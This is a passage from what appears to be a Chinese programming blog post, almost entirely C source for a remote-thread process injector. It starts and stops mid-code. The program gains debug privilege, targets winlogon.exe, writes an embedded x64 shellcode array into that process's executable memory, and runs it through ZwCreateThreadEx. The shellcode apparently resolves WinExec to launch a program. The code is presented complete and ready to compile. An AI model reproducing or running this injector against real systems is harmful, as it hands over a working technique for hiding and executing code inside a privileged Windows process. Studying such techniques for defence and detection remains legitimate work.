	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"process open erro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//在要被注入的进程中创建内存，用于存放注入dll的路径</span>
	Buff <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>Buff <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Buff alloc error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//将dll路径写入刚刚创建的内存中</span>
	<span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> Buff<span class="token punctuation">,</span> shellcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">!=</span> write_len<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//加载ntdll.dll并从中获取内核函数ZwCreateThread，并使用函数指针指向此函数</span>
	Ntdll <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pZwCreateThreadEx ZwCreateThreadEx <span class="token operator">=</span>
		<span class="token punctuation">(</span>pZwCreateThreadEx<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>Ntdll<span class="token punctuation">,</span> <span class="token string">"ZwCreateThreadEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ZwCreateThreadEx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"func get error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//执行ZwCreateThread函数，在指定进程中创建线程加载要被注入的dll</span>
	dwStatus <span class="token operator">=</span> <span class="token function">ZwCreateThreadEx</span><span class="token punctuation">(</span>
		<span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span>
		PROCESS_ALL_ACCESS<span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		hProcess<span class="token punctuation">,</span>
		<span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>Buff<span class="token punctuation">,</span>
		<span class="token constant">NULL</span><span class="token punctuation">,</span>
		<span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
		<span class="token constant">NULL</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hRemoteThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"zwcreatethread fun error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//释放不需要的变量以及内存</span>
	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">FreeModule</span><span class="token punctuation">(</span>Ntdll<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>完整代码如下</p> 
<pre><code class="prism language-c"><span class="token comment">/************************************************************
*                     Author:Pluviophile                    *
*                    Date:2020/9/27-23:03                   *
*     E-Mail:1565203609@qq.com/pluviophile12138@outlook.com *
*         远线程注入，将shellcode指定注入指定的进程执行     *
*************************************************************/</span>

<span class="token macro property">#<span class="token directive keyword">pragma</span> once</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;TlHelp32.h&gt;</span></span>

<span class="token comment">//shellcode机器码</span>
<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> 
<span class="token punctuation">{<!-- --></span>
	<span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>
	<span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span>
	<span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span>
	<span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>
	<span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xC1</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x9B</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>
	<span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0xC3</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>


<span class="token comment">/*判断系统架构，并定义ZwCreateThreadEx函数指针*/</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _WIN64</span>
<span class="token keyword">typedef</span>	<span class="token function">DWORD</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> pZwCreateThreadEx<span class="token punctuation">)</span><span class="token punctuation">(</span>
	PHANDLE ThreadHandle<span class="token punctuation">,</span>
	ACCESS_MASK DesiredAccess<span class="token punctuation">,</span>
	LPVOID ObjectAttributes<span class="token punctuation">,</span>
	HANDLE ProcessHandle<span class="token punctuation">,</span>
	LPTHREAD_START_ROUTINE lpStartAddress<span class="token punctuation">,</span>
	LPVOID lpParameter<span class="token punctuation">,</span>
	ULONG CreateThreadFlags<span class="token punctuation">,</span>
	SIZE_T ZeroBits<span class="token punctuation">,</span>
	SIZE_T StackSize<span class="token punctuation">,</span>
	SIZE_T MaximumStackSize<span class="token punctuation">,</span>
	LPVOID pUnkown
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
<span class="token keyword">typedef</span> <span class="token function">DWORD</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> pZwCreateThreadEx<span class="token punctuation">)</span><span class="token punctuation">(</span>
	PHANDLE ThreadHandle<span class="token punctuation">,</span>
	ACCESS_MASK DesiredAccess<span class="token punctuation">,</span>
	LPVOID ObjectAttributes<span class="token punctuation">,</span>
	HANDLE ProcessHandle<span class="token punctuation">,</span>
	LPTHREAD_START_ROUTINE lpStartAddress<span class="token punctuation">,</span>
	LPVOID lpParameter<span class="token punctuation">,</span>
	BOOL CreateSuspended<span class="token punctuation">,</span>
	DWORD dwStackSize<span class="token punctuation">,</span>
	DWORD dw1<span class="token punctuation">,</span>
	DWORD dw2<span class="token punctuation">,</span>
	LPVOID pUnkown
	<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

<span class="token comment">/*
设定本进程的程序调试权限
lPcstr:权限字符串
backCode:错误返回码
*/</span>
BOOL <span class="token function">GetDebugPrivilege</span><span class="token punctuation">(</span>
_In_ LPCSTR lPcstr<span class="token punctuation">,</span>
_Inout_ DWORD<span class="token operator">*</span> backCode
<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	HANDLE Token <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	LUID luid <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	TOKEN_PRIVILEGES Token_privileges <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token comment">//内存初始化为zero</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>luid<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>luid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Token_privileges<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token_privileges<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//打开进程令牌</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> TOKEN_QUERY <span class="token operator">|</span> TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//获取特权luid</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">LookupPrivilegeValue</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>lPcstr<span class="token punctuation">,</span><span class="token operator">&amp;</span>luid<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//设定结构体luid与特权</span>
	Token_privileges<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	Token_privileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid <span class="token operator">=</span> luid<span class="token punctuation">;</span>
	Token_privileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span> SE_PRIVILEGE_ENABLED<span class="token punctuation">;</span>

	<span class="token comment">//修改进程特权</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">AdjustTokenPrivileges</span><span class="token punctuation">(</span>Token<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Token_privileges<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TOKEN_PRIVILEGES<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
根据进程名获取进程pid，执行无误返回进程pid，出错返回-1
ProcessName:进程名
backCode:错误返回码
*/</span>
<span class="token keyword">int</span> <span class="token function">GetProcessPid</span><span class="token punctuation">(</span>
	_In_ <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> ProcessName<span class="token punctuation">,</span>
	_Inout_ DWORD<span class="token operator">*</span> backCode
<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	PROCESSENTRY32 P32 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	HANDLE H32 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token comment">//内存初始化为zeor</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>P32<span class="token punctuation">,</span> <span class="token number">0X00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>P32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//创建快照</span>
	H32 <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	P32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>H32 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//开始循环遍历进程</span>
	BOOL ret <span class="token operator">=</span> <span class="token function">Process32First</span><span class="token punctuation">(</span>H32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token comment">//发现指定进程存在</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>P32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> ProcessName<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> P32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		ret <span class="token operator">=</span> <span class="token function">Process32Next</span><span class="token punctuation">(</span>H32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
主函数
*/</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//对必要的变量进行声明以及初始化</span>
	DWORD backCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	HANDLE hProcess <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	LPVOID Buff <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HMODULE Ntdll <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T write_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	DWORD dwStatus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">//通过进程名获取pid</span>
	<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">GetProcessPid</span><span class="token punctuation">(</span><span class="token string">"winlogon.exe"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>backCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"pid get error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//提升进程特权，获得调试权限</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetDebugPrivilege</span><span class="token punctuation">(</span>SE_DEBUG_NAME<span class="token punctuation">,</span> <span class="token operator">&amp;</span>backCode<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"DBG privilege error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %d"</span><span class="token punctuation">,</span> backCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//打开要被注入的进程</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"process open erro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
